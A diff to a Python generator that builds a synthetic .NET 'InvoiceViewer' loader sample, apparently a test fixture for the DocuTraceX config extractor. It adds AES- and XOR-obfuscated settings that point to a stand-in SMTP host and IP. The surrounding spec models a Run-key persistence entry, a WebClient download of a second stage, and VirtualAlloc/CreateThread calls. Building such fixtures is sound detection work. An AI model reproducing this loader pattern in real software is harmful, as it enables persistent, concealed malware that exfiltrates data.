@@ -2467,19 +2467,33 @@ def dotnet_loader_exe() -> bytes:
     stub += b"\x00" * (-len(stub) % 16)
     enc = Cipher(algorithms.AES(DOTNET_PAYLOAD_KEY), modes.CBC(b"\x00" * 16)).encryptor()
     payload = enc.update(stub) + enc.finalize()
+    # encrypted settings, decrypted statically by DocuTraceX: AES-128-CBC(iv 0) with MD5("InvoiceSync2024"),
+    # and Base64 + XOR "inv"
+    import base64, hashlib
+    smtp = b"smtp.billing-portal.example"
+    smtp += bytes([16 - len(smtp) % 16]) * (16 - len(smtp) % 16)
+    e2 = Cipher(algorithms.AES(hashlib.md5(b"InvoiceSync2024").digest()), modes.CBC(b"\x00" * 16)).encryptor()
+    enc_smtp = base64.b64encode(e2.update(smtp) + e2.finalize()).decode()
+    enc_ip = base64.b64encode(bytes(c ^ b"inv"[i % 3] for i, c in enumerate(b"203.0.113.47:587"))).decode()
     spec = {"assembly": "InvoiceViewer", "version": (2, 1, 0, 0),
             "refs": [("mscorlib", (4, 0, 0, 0)), ("System", (4, 0, 0, 0))],
             "typerefs": [(0, "System.Reflection", "Assembly"), (None, "", "ConfusedByAttribute"),
                          (1, "System.Net", "WebClient"), (0, "Microsoft.Win32", "RegistryKey"),
-                         (0, "System.Security.Cryptography", "RijndaelManaged")],
+                         (0, "System.Security.Cryptography", "RijndaelManaged"), (0, "System", "Convert")],
             "memberrefs": [(1, ".ctor"), (2, "DownloadData"), (0, "Load"), (3, "SetValue"), (4, "CreateDecryptor"),
-                           (2, ".ctor")],
+                           (2, ".ctor"), (5, "FromBase64String")],
             "attributes": [("module", 1)],
             "types": [{"ns": "InvoiceViewer", "name": "Program", "methods": [
                 {"name": "Main", "entry": True, "ops": [("ldstr", "Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
                                                         ("ldstr", "InvoiceViewer"), ("callvirt", 3), ("ret",)]},
+                {"name": "Configure", "ops": [("ldstr", enc_smtp), ("calldef", "StringCipher::Decrypt"), ("pop",),
+                                              ("ldstr", enc_ip), ("calldef", "StringCipher::Unmask"), ("pop",), ("ret",)]},
                 {"name": "LoadStage", "ops": [("newobj", 5), ("ldstr", CODE_URL), ("callvirt", 1), ("call", 2),
                                               ("pop",), ("ret",)]}]},
+                      {"ns": "InvoiceViewer", "name": "StringCipher", "methods": [
+                          {"name": "Decrypt", "ops": [("ldarg.0",), ("call", 6), ("ldstr", "InvoiceSync2024"), ("callvirt", 4),
+                                                      ("xor",), ("ret",)]},
+                          {"name": "Unmask", "ops": [("ldarg.0",), ("call", 6), ("ldstr", "inv"), ("xor",), ("ret",)]}]},
                       {"ns": "InvoiceViewer", "name": "NativeMethods",
                        "methods": [{"name": "VirtualAlloc", "pinvoke": ("kernel32.dll", "VirtualAlloc")},
                                    {"name": "CreateThread", "pinvoke": ("kernel32.dll", "CreateThread")}]}],
